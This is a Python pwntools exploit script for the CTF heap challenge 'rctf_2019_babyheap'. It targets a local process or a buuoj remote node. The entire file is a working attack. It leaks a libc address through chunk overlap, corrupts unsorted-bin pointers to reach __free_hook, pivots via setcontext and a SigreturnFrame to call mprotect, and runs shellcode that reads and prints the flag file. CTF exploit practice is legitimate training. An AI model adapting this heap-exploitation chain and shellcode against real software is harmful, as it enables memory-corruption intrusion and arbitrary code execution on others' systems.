#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/29 15:10:37
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./rctf_2019_babyheap"
menu = "Choice: \n"
if context.arch == "amd64":
    libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    one_offset = [0x45226,0x4527a,0xf03a4,0xf1247]
    # libc_path = "../../libc/16-64-libc-2.23.so"
    # one_offset = [0x45216,0x4526a,0xf02a4,0xf1147]
else:
    # libc_path = "../../libc/16-32-libc-2.23.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
if debug:
    if context.arch == "amd64":
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 25630
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

def add(size):
    cmd(1)
    sh.recvuntil("Size: ")
    sh.sendline(str(size))

def edit(idx,content):
    cmd(2)
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))
    sh.recvuntil("Content: ")
    sh.send(content)

def dele(idx):
    cmd(3)
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))
def show(idx):
    cmd(4)
    sh.recvuntil("Index: ")
    sh.sendline(str(idx))


# leak libc
def pwn():
    add(0x80) #0
    add(0x68) #1
    add(0xf0) #2
    add(0x18) #3
    dele(0)
    payload = ""
    payload = payload.ljust(0x60,'\x00')
    payload += p64(0x70+0x90)
    edit(1,payload)
    dele(2)
    add(0x80) #0
    show(1)
    leak_addr = u64(sh.recvuntil("\x7f",timeout=0.5).ljust(8,"\x00")) 
    libc_base = leak_addr - 0x3c4b78
    log.info("libc_base=>{}".format(hex(libc_base)))
    free_hook = libc_base + libc.symbols['__free_hook']
    setcontext = libc_base + libc.symbols['setcontext']
    one = libc_base + one_offset[3]
    add(0x160) #2

    add(0x18) #4
    add(0x508) #5
    add(0x18) #6
    add(0x18) #7
    add(0x508) #8
    add(0x18) #9
    add(0x18) #10

    payload = 'a' * 0x4f0 + p64(0x500)
    edit(5,payload)
    dele(5)
    edit(4,'a'*0x18) 
    add(0x18) #5
    add(0x4d8) #11
    dele(5)
    dele(6)
    add(0x30) #5
    add(0x4e8) #6


    payload = 'a' * 0x4f0  + p64(0x500)
    edit(8,payload)
    dele(8)
    edit(7,'a'*0x18)
    add(0x18) #8
    add(0x4d8) #12
    dele(8)
    dele(9)
    add(0x40) #8
    dele(6)
    add(0x4e8) #6
    dele(6)
    fake_chunk_addr = free_hook - 0x20
    # edit unsortedbin->bk
    payload = "\x00" * 0x10 + p64(0) + p64(0x4f1) + p64(0) + p64(fake_chunk_addr)
    edit(11,payload)
    payload = '\x00' * 0x20 + p64(0) + p64(0x4e1) + p64(0) + p64(fake_chunk_addr+8) + p64(0)  + p64(fake_chunk_addr -0x18-5)
    edit(12,payload)
    add(0x48)
    new_addr = free_hook & 0xFFFFFFFFFFFFF000
    shellcode1 = '''
    xor rdi,rdi
    mov rsi,%d
    mov rdx,0x1000
    mov eax,0
    syscall
    jmp rsi
    '''% new_addr
    debug()
    payload = p64(0) * 2 + p64(setcontext+53) + p64(free_hook+0x18) * 2 + asm(shellcode1)
    edit(6,payload)
    frame = SigreturnFrame()
    frame.rsp = free_hook+0x10
    frame.rdi = new_addr
    frame.rsi = 0x1000
    frame.rdx = 7
    frame.rip = libc_base + libc.symbols['mprotect']
    edit(12,str(frame))
    dele(12)
    # debug()
    shellcode2 = '''
    mov rax,0x67616c662f;
    push rax;
    mov rdi,rsp;
    mov rsi,0;
    xor rdx,rdx ;
    mov rax,2;
    syscall;

    mov rdi,rax;
    mov rsi,rsp;
    mov rdx,0x100;
    mov rax,0;
    syscall;

    mov rdi,1;
    mov rsi,rsp;
    mov rdx,rax;
    mov rax,1;
    syscall;

    mov rdi,0;
    mov rax,60;
    syscall;
    '''
    sh.sendline(asm(shellcode2))
    sh.interactive()

if __name__ == "__main__":
	#pwn()

    while True:
        sh = process(file_name)
        try:
            pwn()
        except:
            sh.close()

    debug()